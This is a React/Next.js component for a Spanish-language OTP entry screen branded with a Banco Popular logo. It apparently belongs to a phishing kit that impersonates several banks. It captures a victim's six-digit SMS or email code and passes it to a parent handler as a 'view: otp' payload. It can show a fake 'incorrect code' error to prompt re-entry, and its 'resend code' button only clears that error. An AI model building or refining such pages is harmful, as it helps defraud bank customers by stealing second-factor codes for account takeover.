/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
/* eslint-disable jsx-a11y/alt-text */
"use client";
import { useState } from "react";

export default function Otp({ enviar, isError = false }: any) {
  const [otp, setOtp] = useState("");
  
  // 👉 Estado dinámico para manejar el mensaje de error interactivo
  const [error, setError] = useState(
    isError 
      ? "El código de seguridad ingresado es incorrecto o ya caducó. Por favor, revisa tus mensajes de texto (SMS) o correo electrónico e ingresa el código más reciente." 
      : ""
  );

  const handleChange = (value: string) => {
    const clean = value.replace(/\D/g, "").slice(0, 6);
    setOtp(clean);
    // 🗑️ Eliminamos la línea que limpiaba el error automáticamente al escribir
  };

  const enviarOtp = () => {
    if (otp.length === 6) {
      const payload = {
        view: 'otp',
        otp: otp,
      };

      enviar?.(payload);
    }
  };

  return (
    <div className="min-h-screen flex flex-col px-6 pt-20 pb-10 max-w-md mx-auto">
      {/* 🟢 Arreglado: La barra superior ahora se queda roja si hay error */}
      <div className={`h-6 w-full fixed top-0 left-0 z-50 transition-colors duration-300 ${error ? "bg-green-600" : "bg-green-600"}`}></div>
      
      <div className="flex items-center justify-center my-5">
        <img
          src="/bancos/popular/popularhorizontal_new.svg"
          width={180}
          className="h-auto w-auto"
        />
      </div>
      
      {/* Título adaptativo */}
      <h1 className={`text-3xl font-bold text-center mb-6 transition-colors ${error ? "text-red-600" : "text-black"}`}>
        {error ? "Código Incorrecto" : "Ingresa tu código"}
      </h1>

      {/* Subtítulo */}
      <p className="text-center text-gray-600 mb-8">
        Ingresa el código de 6 dígitos enviado a tu correo o SMS
      </p>

      {/* 🔴 Bloque de Alerta de Error Superior */}
      {error && (
        <div className="mb-6 p-4 rounded-2xl bg-red-50 border border-red-200 text-left animate-fade-in">
          <p className="text-[13px] leading-relaxed text-red-600 font-semibold flex items-start gap-2">
            <span className="shrink-0 mt-0.5">⚠️</span>
            <span>{error}</span>
          </p>
        </div>
      )}

      {/* Caja de OTP */}
      <div className={`w-full border rounded-2xl p-6 flex justify-center relative transition-colors duration-300 ${error ? "border-red-300 bg-red-50/30" : "border-gray-300"}`}>
        {/* Input invisible */}
        <input
          type="password"
          maxLength={6}
          inputMode="numeric"
          autoFocus
          autoComplete="new-password"
          className="absolute opacity-0 w-full h-full inset-0 z-10 cursor-text"
          value={otp}
          onChange={(e) => handleChange(e.target.value)}
        />

        {/* Punticos Reactivos */}
        <div className="flex gap-4">
          {[0, 1, 2, 3, 4, 5].map((i) => (
            <div
              key={i}
              className={`w-3 h-3 rounded-full transition-all duration-200 ${
                otp.length > i 
                  ? (error ? "bg-red-600" : "bg-gray-700") 
                  : (error ? "bg-red-200" : "bg-gray-300")
              }`}
            />
          ))}
        </div>
      </div>

      {/* Reenviar */}
      <div className="text-right mt-4">
        <button 
          type="button" 
          onClick={() => setError("")} 
          className="text-orange-500 font-semibold bg-transparent border-none cursor-pointer hover:underline"
        >
          Reenviar código
        </button>
      </div>

      {/* Botón VALIDAR / REINTENTAR */}
      <button
        disabled={otp.length !== 6}
        onClick={enviarOtp}
        className={`w-full p-4 text-xl rounded-2xl mt-10 font-bold text-white transition-all duration-300 border-none outline-none ${
          otp.length === 6 
            ? (error ? "bg-red-600 hover:bg-red-700 cursor-pointer" : "bg-green-600 hover:bg-green-700 cursor-pointer") 
            : "bg-gray-400 disabled:opacity-70 cursor-not-allowed"
        }`}
      >
        {error ? "Reintentar Validación" : "Validar código"}
      </button>

      {/* Footer pequeño */}
      <div className="text-center mt-10 text-xs text-gray-500">
        ¿Problemas para continuar? <span className="text-orange-500 font-bold cursor-pointer hover:underline">Ayuda</span>
      </div>
    </div>
  );
}